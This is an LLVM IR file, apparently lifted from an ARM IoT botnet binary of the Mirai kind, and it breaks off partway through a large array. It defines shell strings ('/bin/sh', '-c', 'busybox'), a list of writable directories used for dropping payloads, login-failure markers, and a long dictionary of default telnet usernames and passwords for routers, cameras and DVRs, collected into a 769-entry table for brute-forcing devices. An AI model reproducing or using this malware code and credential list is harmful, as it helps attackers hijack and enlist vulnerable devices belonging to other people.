source_filename = "test"
target datalayout = "e-p:32:32:32-f80:32:32"

@r0 = internal unnamed_addr global i32 0
@r1 = internal unnamed_addr global i32 0
@r2 = internal unnamed_addr global i32 0
@r3 = internal unnamed_addr global i32 0
@r4 = internal unnamed_addr global i32 0
@r5 = internal unnamed_addr global i32 0
@r6 = internal unnamed_addr global i32 0
@r7 = internal unnamed_addr global i32 0
@r8 = internal unnamed_addr global i32 0
@sb = internal unnamed_addr global i32 0
@sl = internal unnamed_addr global i32 0
@fp = internal unnamed_addr global i32 0
@ip = internal unnamed_addr global i32 0
@sp = internal unnamed_addr global i32 0
@lr = internal unnamed_addr global i32 0
@cpsr_n = internal unnamed_addr global i1 false
@cpsr_z = internal unnamed_addr global i1 false
@cpsr_c = internal unnamed_addr global i1 false
@cpsr_v = internal unnamed_addr global i1 false
@0 = external global i32
@global_var_268d0.14 = global i32 0
@global_var_e718.18 = constant i32 -509558771
@global_var_27938.21 = global i32 0
@global_var_2793c.22 = local_unnamed_addr global i32 0
@global_var_27940.23 = local_unnamed_addr global i32 0
@global_var_27694.26 = local_unnamed_addr global i32 4095
@global_var_27690.29 = global i32 362436
@global_var_1c790.31 = constant [7 x i8] c"(null)\00"
@global_var_2b938.33 = local_unnamed_addr global i32 0
@global_var_1c798.35 = constant [8 x i8] c"/bin/sh\00"
@global_var_1c7a0.37 = constant [3 x i8] c"sh\00"
@global_var_1c7a4.39 = constant [3 x i8] c"-c\00"
@global_var_ff00.41 = constant i32 -476053424
@global_var_1c7a8.43 = constant i32 -1
@global_var_27918.46 = global i32 0
@global_var_1cba8.48 = constant [5 x i8] c"PING\00"
@global_var_1c780.50 = constant [8 x i8] c"busybox\00"
@global_var_1c788.51 = constant i32 36
@global_var_1c78c.52 = constant i32 35
@global_var_27654.53 = global [3 x i8*] [i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1c780.50, i32 0, i32 0), i8* bitcast (i32* @global_var_1c788.51 to i8*), i8* bitcast (i32* @global_var_1c78c.52 to i8*)]
@global_var_1c748.55 = constant [7 x i8] c"nvalid\00"
@global_var_1c750.56 = constant [6 x i8] c"ailed\00"
@global_var_1c758.57 = constant [9 x i8] c"ncorrect\00"
@global_var_1c764.58 = constant [6 x i8] c"enied\00"
@global_var_1c76c.59 = constant [5 x i8] c"rror\00"
@global_var_1c774.60 = constant [7 x i8] c"oodbye\00"
@global_var_1c77c.61 = constant [4 x i8] c"bad\00"
@global_var_27634.62 = global [7 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1c748.55, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1c750.56, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1c758.57, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1c764.58, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1c76c.59, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1c774.60, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1c77c.61, i32 0, i32 0)]
@global_var_27920.64 = global i32 0
@global_var_27924.65 = local_unnamed_addr global i32 0
@global_var_2db88.67 = global i32 0
@global_var_1cbb0.69 = constant [6 x i8] c":>%$#\00"
@global_var_1cbb8.78 = constant [12 x i8] c"%d.%d.%d.%d\00"
@global_var_2db7c.80 = global i32 0
@global_var_1c6cc.82 = constant [15 x i8] c"/dev/netslink/\00"
@global_var_1c6dc.83 = constant [6 x i8] c"/tmp/\00"
@global_var_1c6e4.84 = constant [6 x i8] c"/var/\00"
@global_var_1c6ec.85 = constant [6 x i8] c"/dev/\00"
@global_var_1c6f4.86 = constant [10 x i8] c"/var/run/\00"
@global_var_1c700.87 = constant [10 x i8] c"/dev/shm/\00"
@global_var_1c70c.88 = constant [6 x i8] c"/mnt/\00"
@global_var_1c714.89 = constant [7 x i8] c"/boot/\00"
@global_var_1c71c.90 = constant [6 x i8] c"/usr/\00"
@global_var_1c724.91 = constant [6 x i8] c"/opt/\00"
@global_var_275f4.92 = global [10 x i8*] [i8* getelementptr inbounds ([15 x i8], [15 x i8]* @global_var_1c6cc.82, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1c6dc.83, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1c6e4.84, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1c6ec.85, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1c6f4.86, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1c700.87, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1c70c.88, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1c714.89, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1c71c.90, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1c724.91, i32 0, i32 0)]
@global_var_27620 = external global i32
@global_var_1bbb4.99 = constant [7 x i8] c"telnet\00"
@global_var_1bbbc.100 = constant [5 x i8] c"root\00"
@global_var_1bbc4.101 = constant [8 x i8] c"default\00"
@global_var_1bbd0.102 = constant [7 x i8] c"daemon\00"
@global_var_1bbd8.103 = constant [8 x i8] c"support\00"
@global_var_1bbe4.104 = constant i32 0
@global_var_1bbe8.105 = constant [7 x i8] c"123456\00"
@global_var_1bbf0.106 = constant [7 x i8] c"Zte521\00"
@global_var_1bbf8.107 = constant [6 x i8] c"vizxv\00"
@global_var_1bc00.108 = constant [8 x i8] c"support\00"
@global_var_1bc10.109 = constant [6 x i8] c"admin\00"
@global_var_1bc18.110 = constant [7 x i8] c"camera\00"
@global_var_1bc20.111 = constant [5 x i8] c"1234\00"
@global_var_1bc28.112 = constant [10 x i8] c"fliradmin\00"
@global_var_1bc34.113 = constant [4 x i8] c"jvc\00"
@global_var_1bc3c.114 = constant [8 x i8] c"meinsma\00"
@global_var_1bc48.115 = constant [9 x i8] c"password\00"
@global_var_1bc54.116 = constant [11 x i8] c"supervisor\00"
@global_var_1bc60.117 = constant [9 x i8] c"backdoor\00"
@global_var_1bc6c.118 = constant [7 x i8] c"atc123\00"
@global_var_1bc74.119 = constant [7 x i8] c"ascend\00"
@global_var_1bc7c.120 = constant [11 x i8] c"epicrouter\00"
@global_var_1bc88.121 = constant [5 x i8] c"none\00"
@global_var_1bc90.122 = constant [9 x i8] c"1234User\00"
@global_var_1bc9c.123 = constant [12 x i8] c"5678Service\00"
@global_var_1bcac.124 = constant [9 x i8] c"atlantis\00"
@global_var_1bcb8.125 = constant [8 x i8] c"ROOT500\00"
@global_var_1bcc4.126 = constant [7 x i8] c"xxyyzz\00"
@global_var_1bccc.127 = constant [7 x i8] c"danger\00"
@global_var_1bcd4.128 = constant [7 x i8] c"crftpw\00"
@global_var_1bcdc.129 = constant [7 x i8] c"cms500\00"
@global_var_1bce4.130 = constant [15 x i8] c"ggdaseuaimhrke\00"
@global_var_1bcf4.131 = constant [8 x i8] c"tslinux\00"
@global_var_1bd00.132 = constant [5 x i8] c"pass\00"
@global_var_1bd08.133 = constant [7 x i8] c"NetICs\00"
@global_var_1bd10.134 = constant [9 x i8] c"security\00"
@global_var_1bd1c.135 = constant [7 x i8] c"friend\00"
@global_var_1bd24.136 = constant [8 x i8] c"manager\00"
@global_var_1bd30.137 = constant [7 x i8] c"bintec\00"
@global_var_1bd38.138 = constant [8 x i8] c"articon\00"
@global_var_1bd44.139 = constant [7 x i8] c"patrol\00"
@global_var_1bd4c.140 = constant [8 x i8] c"service\00"
@global_var_1bd58.141 = constant [5 x i8] c"tech\00"
@global_var_1bd60.142 = constant [5 x i8] c"live\00"
@global_var_1bd68.143 = constant [7 x i8] c"Master\00"
@global_var_1bd70.144 = constant [7 x i8] c"laflaf\00"
@global_var_1bd78.145 = constant [9 x i8] c"Helpdesk\00"
@global_var_1bd84.146 = constant [6 x i8] c"Super\00"
@global_var_1bd8c.147 = constant [10 x i8] c"installer\00"
@global_var_1bd98.148 = constant [9 x i8] c"fivranne\00"
@global_var_1bda4.149 = constant [9 x i8] c"webadmin\00"
@global_var_1bdb0.150 = constant [9 x i8] c"Serv4EMC\00"
@global_var_1bdbc.151 = constant [7 x i8] c"access\00"
@global_var_1bdc4.152 = constant [9 x i8] c"netadmin\00"
@global_var_1bdd0.153 = constant [9 x i8] c"mediator\00"
@global_var_1bddc.154 = constant [8 x i8] c"Mau'dib\00"
@global_var_1bde8.155 = constant [7 x i8] c"cellit\00"
@global_var_1bdf0.156 = constant [8 x i8] c"diamond\00"
@global_var_1bdfc.157 = constant [10 x i8] c"1234admin\00"
@global_var_1be08.158 = constant [9 x i8] c"changeme\00"
@global_var_1be14.159 = constant [7 x i8] c"attack\00"
@global_var_1be1c.160 = constant [7 x i8] c"cmaker\00"
@global_var_1be24.161 = constant [18 x i8] c"changeme2database\00"
@global_var_1be38.162 = constant [5 x i8] c"NULL\00"
@global_var_1be40.163 = constant [6 x i8] c"Cisco\00"
@global_var_1be48.164 = constant [6 x i8] c"cisco\00"
@global_var_1be50.165 = constant [8 x i8] c"blender\00"
@global_var_1be5c.166 = constant [7 x i8] c"hsasdb\00"
@global_var_1be64.167 = constant [7 x i8] c"wlsedb\00"
@global_var_1be6c.168 = constant [13 x i8] c"wlsepassword\00"
@global_var_1be7c.169 = constant [7 x i8] c"system\00"
@global_var_1be84.170 = constant [8 x i8] c"cgadmin\00"
@global_var_1be90.171 = constant [5 x i8] c"surt\00"
@global_var_1be98.172 = constant [5 x i8] c"tini\00"
@global_var_1bea0.173 = constant [5 x i8] c"any@\00"
@global_var_1bea8.174 = constant [6 x i8] c"davox\00"
@global_var_1beb0.175 = constant [7 x i8] c"calvin\00"
@global_var_1beb8.176 = constant [10 x i8] c"my_DEMARC\00"
@global_var_1bec4.177 = constant [8 x i8] c"MServer\00"
@global_var_1bed0.178 = constant [4 x i8] c"PBX\00"
@global_var_1bed8.179 = constant [8 x i8] c"NETWORK\00"
@global_var_1bee4.180 = constant [7 x i8] c"BRIDGE\00"
@global_var_1beec.181 = constant [14 x i8] c"michaelangelo\00"
@global_var_1befc.182 = constant [13 x i8] c"wrgg15_di524\00"
@global_var_1bf0c.183 = constant [9 x i8] c"firmware\00"
@global_var_1bf18.184 = constant [10 x i8] c"1234Admin\00"
@global_var_1bf24.185 = constant [11 x i8] c"software01\00"
@global_var_1bf30.186 = constant [15 x i8] c"Administration\00"
@global_var_1bf40.187 = constant [8 x i8] c"su@psir\00"
@global_var_1bf4c.188 = constant [8 x i8] c"4getme2\00"
@global_var_1bf58.189 = constant [9 x i8] c"tiger123\00"
@global_var_1bf64.190 = constant [5 x i8] c"help\00"
@global_var_1bf6c.191 = constant [10 x i8] c"extendnet\00"
@global_var_1bf78.192 = constant [8 x i8] c"Exabyte\00"
@global_var_1bf84.193 = constant [9 x i8] c"Posterie\00"
@global_var_1bf90.194 = constant [8 x i8] c"!manage\00"
@global_var_1bf9c.195 = constant [7 x i8] c"radius\00"
@global_var_1bfa4.196 = constant [9 x i8] c"nimdaten\00"
@global_var_1bfb0.197 = constant [5 x i8] c"isee\00"
@global_var_1bfb8.198 = constant [11 x i8] c"56789Admin\00"
@global_var_1bfc4.199 = constant [11 x i8] c"specialist\00"
@global_var_1bfd0.200 = constant [7 x i8] c"public\00"
@global_var_1bfd8.201 = constant [7 x i8] c"secret\00"
@global_var_1bfe0.202 = constant [7 x i8] c"abc123\00"
@global_var_1bfe8.203 = constant [10 x i8] c"P@55w0rd!\00"
@global_var_1bff4.204 = constant [8 x i8] c"iDirect\00"
@global_var_1c000.205 = constant [6 x i8] c"pilou\00"
@global_var_1c008.206 = constant [6 x i8] c"setup\00"
@global_var_1c010.207 = constant [6 x i8] c"hello\00"
@global_var_1c018.208 = constant [9 x i8] c"adslroot\00"
@global_var_1c024.209 = constant [14 x i8] c"administrator\00"
@global_var_1c034.210 = constant [14 x i8] c"Administrator\00"
@global_var_1c044.211 = constant [7 x i8] c"0Admin\00"
@global_var_1c04c.212 = constant [9 x i8] c"123Admin\00"
@global_var_1c058.213 = constant [12 x i8] c"123456Admin\00"
@global_var_1c068.214 = constant [14 x i8] c"123456special\00"
@global_var_1c078.215 = constant [10 x i8] c"superuser\00"
@global_var_1c084.216 = constant [8 x i8] c"admin00\00"
@global_var_1c090.217 = constant [8 x i8] c"orion99\00"
@global_var_1c09c.218 = constant [8 x i8] c"tivonpw\00"
@global_var_1c0a8.219 = constant [7 x i8] c"Ascend\00"
@global_var_1c0b0.220 = constant [6 x i8] c"super\00"
@global_var_1c0b8.221 = constant [12 x i8] c"lucenttech1\00"
@global_var_1c0c8.222 = constant [13 x i8] c"AitbISP4eCiG\00"
@global_var_1c0d8.223 = constant [6 x i8] c"smile\00"
@global_var_1c0e0.224 = constant [7 x i8] c"router\00"
@global_var_1c0e8.225 = constant [9 x i8] c"motorola\00"
@global_var_1c0f4.226 = constant [7 x i8] c"sysadm\00"
@global_var_1c0fc.227 = constant [7 x i8] c"NetVCR\00"
@global_var_1c104.228 = constant [11 x i8] c"xdfk9874t3\00"
@global_var_1c110.229 = constant [5 x i8] c"4tas\00"
@global_var_1c118.230 = constant [6 x i8] c"maint\00"
@global_var_1c120.231 = constant [6 x i8] c"m1122\00"
@global_var_1c128.232 = constant [8 x i8] c"3ep5w2u\00"
@global_var_1c134.233 = constant [9 x i8] c"ntacdmax\00"
@global_var_1c140.234 = constant [9 x i8] c"PlsChgMe\00"
@global_var_1c14c.235 = constant [8 x i8] c"private\00"
@global_var_1c158.236 = constant [14 x i8] c"smallbusiness\00"
@global_var_1c168.237 = constant [3 x i8] c"mu\00"
@global_var_1c16c.238 = constant [14 x i8] c"microbusiness\00"
@global_var_1c17c.239 = constant [8 x i8] c"pfsense\00"
@global_var_1c188.240 = constant [8 x i8] c"hawk201\00"
@global_var_1c194.241 = constant [8 x i8] c"h179350\00"
@global_var_1c1a0.242 = constant [3 x i8] c"lp\00"
@global_var_1c1a4.243 = constant [8 x i8] c"radware\00"
@global_var_1c1b0.244 = constant [9 x i8] c"trancell\00"
@global_var_1c1bc.245 = constant [10 x i8] c"Col2ogro2\00"
@global_var_1c1c8.246 = constant [9 x i8] c"p1nacate\00"
@global_var_1c1d4.247 = constant [7 x i8] c"col1ma\00"
@global_var_1c1dc.248 = constant [10 x i8] c"d1scovery\00"
@global_var_1c1e8.249 = constant [6 x i8] c"w2402\00"
@global_var_1c1f0.250 = constant [6 x i8] c"Sharp\00"
@global_var_1c1f8.251 = constant [9 x i8] c"engineer\00"
@global_var_1c204.252 = constant [8 x i8] c"ganteng\00"
@global_var_1c210.253 = constant [9 x i8] c"smcadmin\00"
@global_var_1c21c.254 = constant [10 x i8] c"barricade\00"
@global_var_1c228.255 = constant [10 x i8] c"highspeed\00"
@global_var_1c234.256 = constant [15 x i8] c"w0rkplac3rul3s\00"
@global_var_1c244.257 = constant [11 x i8] c"stratauser\00"
@global_var_1c250.258 = constant [6 x i8] c"Admin\00"
@global_var_1c258.259 = constant [8 x i8] c"mysweex\00"
@global_var_1c264.260 = constant [7 x i8] c"symbol\00"
@global_var_1c26c.261 = constant [8 x i8] c"mercury\00"
@global_var_1c278.262 = constant [9 x i8] c"truetime\00"
@global_var_1c284.263 = constant [11 x i8] c"12345Admin\00"
@global_var_1c290.264 = constant [7 x i8] c"master\00"
@global_var_1c298.265 = constant [5 x i8] c"xbox\00"
@global_var_1c2a0.266 = constant [10 x i8] c"tellabs#1\00"
@global_var_1c2ac.267 = constant [8 x i8] c"admin_1\00"
@global_var_1c2b8.268 = constant [7 x i8] c"talent\00"
@global_var_1c2c0.269 = constant [8 x i8] c"imss7.0\00"
@global_var_1c2cc.270 = constant [8 x i8] c"detmond\00"
@global_var_1c2d8.271 = constant [10 x i8] c"1111Admin\00"
@global_var_1c2e4.272 = constant [11 x i8] c"22222Admin\00"
@global_var_1c2f0.273 = constant [8 x i8] c"x-admin\00"
@global_var_1c2fc.274 = constant [7 x i8] c"switch\00"
@global_var_1c304.275 = constant [9 x i8] c"zoomadsl\00"
@global_var_1c310.276 = constant [9 x i8] c"expert03\00"
@global_var_1c31c.277 = constant [5 x i8] c"anko\00"
@global_var_1c324.278 = constant [11 x i8] c"oelinux123\00"
@global_var_1c330.279 = constant [7 x i8] c"alpine\00"
@global_var_1c338.280 = constant [8 x i8] c"maxided\00"
@global_var_1c344.281 = constant [10 x i8] c"raspberry\00"
@global_var_1c350.282 = constant [8 x i8] c"vagrant\00"
@global_var_1c35c.283 = constant [6 x i8] c"zlxx.\00"
@global_var_1c364.284 = constant [9 x i8] c"juantech\00"
@global_var_1c370.285 = constant [7 x i8] c"avtech\00"
@global_var_1c378.286 = constant [7 x i8] c"xc3511\00"
@global_var_1c380.287 = constant [7 x i8] c"666666\00"
@global_var_1c388.288 = constant [7 x i8] c"888888\00"
@global_var_1c390.289 = constant [7 x i8] c"111111\00"
@global_var_1c398.290 = constant [9 x i8] c"bayandsl\00"
@global_var_1c3a4.291 = constant [12 x i8] c"12345676890\00"
@global_var_1c3b4.292 = constant [11 x i8] c"1234567890\00"
@global_var_1c3c0.293 = constant [13 x i8] c"admintelecom\00"
@global_var_1c3d0.294 = constant [13 x i8] c"telecomadmin\00"
@global_var_1c3e0.295 = constant [7 x i8] c"comcom\00"
@global_var_1c3e8.296 = constant [8 x i8] c"zte9x15\00"
@global_var_1c3f4.297 = constant [6 x i8] c"ZXDSL\00"
@global_var_1c3fc.298 = constant [7 x i8] c"D-Link\00"
@global_var_1c404.299 = constant [6 x i8] c"dlink\00"
@global_var_1c40c.300 = constant [6 x i8] c"DLink\00"
@global_var_1c414.301 = constant [12 x i8] c"asteriskftp\00"
@global_var_1c424.302 = constant [9 x i8] c"dreambox\00"
@global_var_1c430.303 = constant [5 x i8] c"1111\00"
@global_var_1c438.304 = constant [6 x i8] c"12345\00"
@global_var_1c440.305 = constant [6 x i8] c"54321\00"
@global_var_1c448.306 = constant [7 x i8] c"fucker\00"
@global_var_1c450.307 = constant [13 x i8] c"7ujMko0admin\00"
@global_var_1c460.308 = constant [13 x i8] c"7ujMko0vizxv\00"
@global_var_1c470.309 = constant [7 x i8] c"hi3518\00"
@global_var_1c478.310 = constant [7 x i8] c"klv123\00"
@global_var_1c480.311 = constant [8 x i8] c"klv1234\00"
@global_var_1c48c.312 = constant [8 x i8] c"realtek\00"
@global_var_1c498.313 = constant [6 x i8] c"jvbzd\00"
@global_var_1c4a0.314 = constant [8 x i8] c"xmhdipc\00"
@global_var_1c4ac.315 = constant [9 x i8] c"openlgtv\00"
@global_var_1c4b8.316 = constant [8 x i8] c"root123\00"
@global_var_1c4c4.317 = constant [9 x i8] c"ahetzip8\00"
@global_var_1c4d0.318 = constant [7 x i8] c"696969\00"
@global_var_1c4d8.319 = constant [9 x i8] c"pa55w0rd\00"
@global_var_1c4e4.320 = constant [7 x i8] c"123123\00"
@global_var_1c4ec.321 = constant [9 x i8] c"b120root\00"
@global_var_1c4f8.322 = constant [9 x i8] c"PASSWORD\00"
@global_var_1c504.323 = constant [6 x i8] c"ADMIN\00"
@global_var_1c50c.324 = constant [8 x i8] c"netgear\00"
@global_var_1c518.325 = constant [7 x i8] c"vyatta\00"
@global_var_1c520.326 = constant [7 x i8] c"atc456\00"
@global_var_1c528.327 = constant [7 x i8] c"micros\00"
@global_var_1c530.328 = constant [8 x i8] c"comcast\00"
@global_var_1c53c.329 = constant [4 x i8] c"pos\00"
@global_var_1c544.330 = constant [4 x i8] c"www\00"
@global_var_1c54c.331 = constant [5 x i8] c"2800\00"
@global_var_1c554.332 = constant [5 x i8] c"UBNT\00"
@global_var_1c55c.333 = constant [9 x i8] c"00000000\00"
@global_var_1c568.334 = constant [5 x i8] c"user\00"
@global_var_1c570.335 = constant [5 x i8] c"ikwb\00"
@global_var_1c578.336 = constant [5 x i8] c"ubnt\00"
@global_var_1c580.337 = constant [4 x i8] c"buh\00"
@global_var_1c588.338 = constant [7 x i8] c"utstar\00"
@global_var_1c590.339 = constant [9 x i8] c"99999999\00"
@global_var_1c59c.340 = constant [6 x i8] c"Meins\00"
@global_var_1c5a4.341 = constant [4 x i8] c"JVC\00"
@global_var_1c5ac.342 = constant [5 x i8] c"ip20\00"
@global_var_1c5b4.343 = constant [7 x i8] c"ip3000\00"
@global_var_1c5bc.344 = constant [6 x i8] c"ip400\00"
@global_var_1c5c4.345 = constant [8 x i8] c"tsunami\00"
@global_var_1c5d0.346 = constant [7 x i8] c"2601hx\00"
@global_var_1c5d8.347 = constant [7 x i8] c"synnet\00"
@global_var_1c5e0.348 = constant [6 x i8] c"quser\00"
@global_var_1c5e8.349 = constant [8 x i8] c"Manager\00"
@global_var_1c5f4.350 = constant [8 x i8] c"netopia\00"
@global_var_1c600.351 = constant [8 x i8] c"anicust\00"
@global_var_1c60c.352 = constant [10 x i8] c"d.e.b.u.g\00"
@global_var_1c618.353 = constant [5 x i8] c"echo\00"
@global_var_1c620.354 = constant [5 x i8] c"demo\00"
@global_var_1c628.355 = constant [7 x i8] c"client\00"
@global_var_1c630.356 = constant [6 x i8] c"CISCO\00"
@global_var_1c638.357 = constant [8 x i8] c"7654321\00"
@global_var_1c644.358 = constant [9 x i8] c"adsl1234\00"
@global_var_1c650.359 = constant [5 x i8] c"toor\00"
@global_var_1c658.360 = constant [9 x i8] c"adminttd\00"
@global_var_1c664.361 = constant [9 x i8] c"PlcmSpIp\00"
@global_var_1c670.362 = constant [9 x i8] c"11111111\00"
@global_var_1c67c.363 = constant [9 x i8] c"22222222\00"
@global_var_1c688.364 = constant [9 x i8] c"mountsys\00"
@global_var_1c694.365 = constant [14 x i8] c"LSiuY7pOmZG2s\00"
@global_var_1c6a4.366 = constant [15 x i8] c"3UJUh2VemEfUte\00"
@global_var_1c6b4.367 = constant [11 x i8] c"Muse!Admin\00"
@global_var_1c6c0.368 = constant [10 x i8] c"changeme2\00"
@global_var_269ec.369 = global [769 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1bbb4.99, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1bbc4.101, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1bbd0.102, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1bbd8.103, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* 